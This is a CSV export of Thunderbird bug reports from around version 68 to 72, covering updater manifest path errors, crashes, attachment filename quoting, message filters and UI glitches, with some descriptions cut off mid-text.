Issue id,Summary,Status,Priority,Resolution,Description
1606974,UpdateVerify failures macOS beta 72,RESOLVED,--,FIXED,"Update Verify fails on 72 beta for macOS only on some tests. The problem stems from bug 1482788 which involved some extra files to added to the macOS DMG files during the signing process that were not tracked by the installer/updater. Bug 1568654 fixed that by adding those files to removed-files so the updater would remove them. Except it was fixed incorrectly. Analyzing the update manifests in the macOS MAR file for 72.0b3, these commands are listed towards the end of the file: ``` remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/_CodeSignature/._CodeResources"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/Resources/English.lproj/._schema.strings"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/Resources/English.lproj/._InfoPlist.strings"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/Resources/._schema.xml"" remove ""Thunderbird.app/Contents/Library/Spotlight/thunderbird.mdimporter/Contents/._Info.plist"" ``` The rest of the commands in the update manifests do not have ""Thunderbird.app"" prefixing the rest of the target path: ``` add ""Contents/"
1607012,Automatic update to latest version (68.3.1) since this update its does not start any more.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: After the automatic update to Thuderbird 68.3.1 it crashed at start up of thunderbird. Tried 72.0beta same result. Actual results: Automatic update to Thunderbird 68.3.1 Start application via desktop or start menu, does not make any difference. For 72.0beta: Download and install beta. Start application (desktop and start menu tested) In both cases Thunderbird does not start. It presents the crash reporter. Expected results: I expected, that the application started as usually."
1607029,Previously read messages display only after repairing every folder. New messages display properly.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I did nothing to create this issue, it appeared after downloading the 68.3.1 (32 bit) version. I rebuilt the Global database per your help files to no avail Actual results: Every folder I have, including the inbox, only displays new messages, previously read messages aren't displayed unless selecting right click - properties - repair This is a major problem for doing research in older message. Expected results: All previously read messages in each folder should be displayed when selecting any given folder, in addition to the unread ones"
1607034,Text looks low-res/blocky,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Render text in any email. (Windows 10 1909, NVidia GeForce GT 710 card on 1920 x 1080 displays). Actual results: Text looks low-res/blocky in both TBird and Firefox, worse at some font sizes. It it as if font smoothing is turned off. Text looks normal in other apps. Expected results: Normal text rendering."
1607037,Does not properly update from 60.9.1 to 68.3.1 (or 68.4 or 68.5),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Allowed Thunderbird to attempt automatic update from 60.9.1 (64-bit) to 68.3.1 (64-bit). Same behavior results from attempt to install 68.3.1 directly after uninstalling 60.9.1 manually. Actual results: Hangs on ""Applying update"". If it gets beyond that, all fields are blank, most menu items do not work, and it has created a new profile. If I try to select my actual profile, that does not work. It seems that it does not know how to deal with my existing profile properly. I'm on Windows 10 Pro 1809. Expected results: Update should have completed, displayed the accounts, etc., in my profile, and menus should work normally."
1607048,Thunderbird 68.3.1 will only allow me to type short lines of text (72 characters) before it automatically wraps the text being typed to the next line.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Thunderbird 68.3.1 will only allow me to type short lines of text (72 characters) before it automatically wraps the text being typed to the next line. I cannot find a setting that will allow me to type longer variable-length lines of text in email messages that are automatically wrapped to the next line based on the horizontal width of the computer screen and/or window from which an email message is being viewed. Actual results: The same thing happens every time I try to type an email message. Expected results: I should have been able to type variable length text lines that are automatically wrapped to the next line based on the horizontal width of the computer screen and/or window from which a newly composed email message is being viewed."
1607058,bad organisation / explanation of local and remote folders,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: it is not my do ; it is a do of thunderbird. you consider mail-storage in the cloud. my provider was attacked, and their storage was altered. thunderbird memorize pointer to mail, but dont show nothing. content of mail was lost. i prefer local storage. not only : i translate my house in few month, and have not cable link for internet. i work only with wifi on gsm-spot by my smartphone. impossible to write mail without wifi. impossible to write draft without wifi. my account on provider is never empty. Actual results: installer ask questions, but in french, it is not really and not enough clear. in tree-box, external storage is not clearly identified about local storage. it is important to connect to mail-account. but don't forget global installation when you work only in cloud (mail, folder, archive) and when you work partial/only in local (mail/folder/archive). Expected results: in next month, i migrate from actual pc (win7pro) to new computer. like my las migration (10 years old), it is possible to lost all thunderbird content. never mind, i redo."
1607062,"""Check for new messages at startup"" doesn't work. Changing mail.accountmanager.defaultaccount helps, briefly, then problem returns",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Preconditions: I monitor several email-adresses, mostly from aol.de and aol.com, but also gmx.de and t-online.de. For all of these adresses, the ""Check for new messages at startup"" (German: ""Beim Starten auf neue Nachrichten prüfen"") is activated. This worked flawlessly up until beta 70 or 71. The problem still exists with version 72b3. Steps to reproduce: <a> Before starting Thunderbird, make sure there are unread messages (e. g. by using the web-interface of your provider) <b> Start Thunderbird <c> Watch as Thunderbird is checking for new messages Actual results: In the status bar, there are some messages about Thuderbird connecting to the various providers. In most cases, the unread messages (see <a> above) are not shown. It seems as if just one (randomly chosen) acccount gets checked thoroughly. (The activity protocol shows nothing or one account at most.) After 10 minutes of waiting (the standard time), all accounts are finally being checked and this time, the messages from <a> are shown. (Now, the activity protoccol also shows the account(s) that was/were missing befo"
1607075,TypeError: textbox is null aboutAddonsExtra.js,RESOLVED,--,INVALID,nightly build newish profile on system with no add-ons tools > addons TypeError: textbox is null aboutAddonsExtra.js:44:25 <anonymous> chrome://messenger/content/aboutAddonsExtra.js:44 (Async: setTimeout handler) <anonymous> chrome://messenger/content/aboutAddonsExtra.js:42 <anonymous> chrome://messenger/content/aboutAddonsExtra.js:117 inContentOverlays chrome://messenger/content/specialTabs.js:368 onLoad chrome://messenger/content/specialTabs.js:463 loadURI chrome://global/content/elements/browser-custom-element.js:988 _wrapURIChangeCall chrome://global/content/elements/browser-custom-element.js:922 loadURI chrome://global/content/elements/browser-custom-element.js:987 getHtmlBrowser chrome://mozapps/content/extensions/extensions.js:1192 initialize chrome://mozapps/content/extensions/extensions.js:1218 initialize chrome://mozapps/content/extensions/extensions.js:521 initialize chrome://mozapps/content/extensions/extensions.js:129 (Async: EventListener.handleEvent) <anonymous> chrome://mozapps/content/extensions/extensions.js:66
1607078,gears are not functioning,RESOLVED,--,INCOMPLETE,
1607082,Message Filter stopped working on upgrade to TB 68.3.1,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: My system auto updated to 68.3.1 today. Just after I noticed that filtering was not occurring Check on message filter shows the filter was displayed as ""Missing Custom Term"", ""matches"" and nothing - not even a box - for the term to match against. The filter had been working correctly before the upgrade for many, many months. This is the msgFilter file: version=""9"" logging=""no"" name=""Online Gala Entries"" enabled=""yes"" type=""17"" action=""Move to folder"" actionValue=""imap://my.gmail.username%40gmail.com@imap.gmail.com/my.folder.name"" condition=""AND (filtaquilla@mesquilla.com#subjectRegex,matches,^Web entry \d\d\d\d from)"" Note: Foldername, gmail username have been changed for protection. Actual results: Filtering did not occur. The messages appeared in the Inbox Expected results: The messages should have been filed in the folder ""WebEntry"""
1607085,The Thunderbird window expands by ~33% beyond the size of my computer screen upon opening a Calendar Lightening tab and manually resizing is difficult difficult to accomplish.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 Steps to reproduce: Upon opening a Lightning Calendar tab while in the Mail tab of Thunderbird, the entire size of the Thunderbird's window (including all tabs) resizes to about 33% greater than the horizontal size of my visible computer screen. Actual results: Upon opening a Lightning Calendar tab while in the Mail tab of Thunderbird, the entire size of the Thunderbird's window (including all tabs) resizes to about 33% greater than the horizontal size of my visible computer screen. Expected results: The screen size should remain the same size as it is while in the Mail Tab - which actually fits the size of the screen (and resizes properly). I noticed this problem began occurring after I updated Lightning to 68.3.1.1 (December 19, 2019). Again, the problem only occurs after opening a Lightning calendar tab - and it then affects the entire Thunderbird window for all tabs."
1607089,Crash in [@ }'] free-after-use in AsyncIHandlerControl,RESOLVED,--,WORKSFORME,"all crashes are Windows. majority have crash address 0xe5e5e5e5. A few are 0xffffffffffffffff like bp-08f8146a-29f0-4aa9-8eb9-bffca0200104 some are startup crashes, most are not. no apparent correlation to crash address. every crashes I looked at has no third party AV, which seems *quite* odd, and no add-ons (except bp-3284c6dd-172e-4dec-833a-9b1b90200104 has one addon) bp-c9163a13-ea75-48e6-8245-bc7e00200105 crash address 0xe5e5e5e5 0 xul.dll [thunk]:AsyncIHandlerControl::`vcall'{20, {flat}}' }' 1 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1175 2 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 3 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:88 4 xul.dll MessageLoop::RunHandler ipc/chromium/src/base/message_loop.cc:308 5 xul.dll MessageLoop::Run ipc/chromium/src/base/message_loop.cc:290 6 xul.dll nsBaseAppShell::Run widget/nsBaseAppShell.cpp:137 7 xul.dll nsAppShell::Run widget/windows/nsAppShell.cpp:412 8 xul.dll nsAppStartup::Run toolkit/components/startup/nsAppStartup.cpp:276 9 xul.dll XREMain::XRE_mainRun toolkit/xre/nsAppRunner.cpp:4616 beta crash bp-0d69007e-3d56-4133-bc13-22bba0191219"
1607091,Thunderbird 68.3.1 (32 bit) refuses to find and open Word doc attachments after last update,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: Open a Thunderbird 68.3.1 (32 bit) and open any email message that has a Word document attached. Then double click on the dot doc file listed at bottom of message. Word opens but then can't find the file. However, if I right click that same file and save it to the hard drive Word has no problem opening it. This is not the behavior that has been normal up until the last and latest update. Actual results: After the last and latest update Thunderbird fails to link the attached file correctly so Word can not find the file but the file is not corrupt and can be verified by saving the attached file to the hard drive. Expected results: Prior to the last update I could double click an attached Word document and Word would open and then open the attached file. After the last update that stopped. Word opens but is unable to locate the file."
1607094,Unable to move messages from inbox to IMAP folder,RESOLVED,--,DUPLICATE,"+++ This bug was initially created as a clone of Bug #1522483 +++ User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Steps to reproduce: Using Thunderbird with GMail account. No local folders, just remote IMAP folders (labels). At startup, message moves to a folder (using menu or click and drag) work fine. After some time (and several moves to the same IMAP folder), I am no longer able to move messages to that folder. Moves to other IMAP folders continue to work. Restarting the software clears the error. Actual results: Message ""Moves"" to a folder stop working after having moved several messages to that folder. Expected results: Message ""Moves"" should always work. **I was finally able to reproduce this problem while running in Debug mode. The log file has been uploaded to Google Drive (too large to attach). File URL is:** https://drive.google.com/file/d/1-29WcT43O49Sc_G2RiD4KjKn7hrsLF3v/view?usp=sharing"
1607098,Attachment filename with more than two words separated by spaces will not open,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 CCleaner/77.1.1834.93 Steps to reproduce: Am using Thunderbird 68.3.1 replease sent myself a test email with a Microsoft Word file attached containing 3 words in its filename Actual results: clicking on attachment starts Microsoft word, but it reports it cannot open a file, which is reported as a Microsoft Word file with only the first word as its filename. Expected results: Ms Word should have open the file correctly, as previous versions of Thunderbird have allowed."
1607164,Deleting a message in a standalone window only removed the delete button.,RESOLVED,--,WORKSFORME,"Following the steps to reproduce given in bug 646168#c23 > https://support.mozilla.org/en-US/questions/1272097 > Testing another user claiming a bug where window does not close on delete. > Agreed there was a bug, but also managed to get a crash on last test. > > > Windows 10 > Thunderbird 68.2.1 > Set Unified view > The following all performed in the 'Unified Inbox' > Set Sort by to include threaded > Set options: Open messages in: 'An existing message window' and 'Close message window/tab on move or delete' > > Double click to open any message - not necessarily a threaded email. > email opens in new window. > Click on 'Delete' button > Window with deleted messages remains open, but note the 'Delete' button has been removed. > Close 'deleted email' window - top right X > > Set options: Open messages in: 'An new message window' and 'Close message window/tab on move or delete' > Open email, email opens in new window, click on 'Delete'. Same result as above. > Close 'deleted email' window - top right X Deleting the message does remove the delete button from the window. So filing this bug to follow that up."
1607197,Completely lost everything in new update,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Went to get new update and everything gone. Actual results: Everything gone, all settings, etc. Expected results: Upgrade shouldn't have lost the original settings."
1607377,newline chars of signature text from external plain text file not included in signature,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Included newline characters before and after other text in signature (plain text, not from an external file). Actual results: Newlines were stripped. Expected results: Text should be left as entered."
1607416,Applying update never finishing,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Opened Thunderbird from my desktop, was given a small window telling me it was updating, it then loading the program but did not display my email account or any relevant information. Wouldn't allow me to click on anything other than 'About Thunderbird' where it informed me that it was 'applying update 68.3.1 (32-bit)'. Actual results: Quite simply, nothing happened! It has continued to say 'applying update' ever since. It's now been a day and a bit that's it been doing this, meaning I can't access my emails (first started Monday January 6th). Expected results: Being able to access my emails is what should have happened!!"
1607425,"From View Source, german content has encoding issue",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: 1. Select an article within a newsgroup, whose subject/body contains german characters 2. Click on drop-down button ""More"" and select ""View Source"" option Actual results: Subject/Title are displayed with some strange characters Expected results: Subject/Title are displayed properly without strange characters."
1607453,"problemas con el manejo de adjuntos, en la versión Thunderbird Setup 68.3.0 y superior",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Thunderbird Setup 68.3.0 no maneja correctamente los adjuntos Actual results: los adjuntos con nombres compuestos con espacios intermedios se abren de forma inadecuada y la aplicación predeterminada intenta abrir archivos no válidos en ubicaciones incorrectas.
1607462,New messages no longer load automatically at startup,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Double checked options Actual results: Nothing Expected results: After latest update (68.3.1) Tbird no longer automatically downloads new messages at startup. Yes I checked that no option had changed
1607477,"""Insert HTML"" pane doesn't resize well",RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I occasionally modify my messages in HTML directly, using the menu functions Edit -> Select All Insert -> HTML These give me a (small) pane containing the HTML representation of the message, which I can edit directly. Actual results: That being said, the HTML pane is too small to give a good view of the bracketed HTML constructs. I can resize the pane horizontally and it gives a wider view. If I resize the pane vertically, however, it resizes the ""dead"" area of the pane rather than the edit-window, which is useless. Expected results: The edit-window of the Edit HTML pane should re-size both vertically & horizontally."
1607480,Unread message in dark theme,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: In Thunderbird 64bit 68.3.1 color of unread message in dark theme is no longer blue but it is withe as old less readable version. Please see the attached image. Actual results: Text color of unread message in message pane is white. Expected results: Text color of unread message in message pane should be blue."
1607504,Print Preview window looks weird,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I've clicked on the Print Preview menu entry in main menu. Actual results: The Print Preview window's upper toolbar part is enormous instead of being a few pixels high. Expected results: The Print Preview window's upper toolbar part should be at least a few dozens of pixels high.
1607510,Missing double quotes when passing filename to external program,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I've clicked on an attachment to open it. Actual results: When the filename has spaces in it, there are multiple dialogs about not finding the file, so when the filename has 3 spaces separating words in it, there are 4 dialogs. Expected results: Prior to version 72 everything worked fine, since Thunderbird has passed the filename in double quotes, like ""this is a file.pdf"", so the external application knew he got one filename as one parameter in double quotes. From version 72 it passes the above filename as this is a file.pdf which renders opening links unusable. Saving the file to somewhere then opening it is the only possible solution ATM. (I also created a Windows .CMD file to check how many parameters it gets, and when calling it from TB 72 it got 4 parameters taking the above example. I've attached the two dialogs I've got with opening ""sc-PortaCreator_Kieg december1.xlsx"" (there are no double quotes in the filename, of course, bug TB should pass filenames like this)."
1607515,Drag and drop to right-hand side of Add-Ons Manager doesn't work (take 2),RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1566347 +++ It broke again. TB 72 beta 3 already not working. Alice, could you please find the regression for us: STR: Get some TB add-on as XPI file, drag the file onto the Add-ons manager. It shows a stop sign."
1607526,Don't show the To: field if the Newsgroup or Follow-up fields are in use,RESOLVED,--,FIXED,"As per Magnus comment on bug 1601748#c7 > if you have a newsgroup selected it should not have To showing at all. Newsgroup should show, and maybe Follow-up too, since that's kind of standard for news."
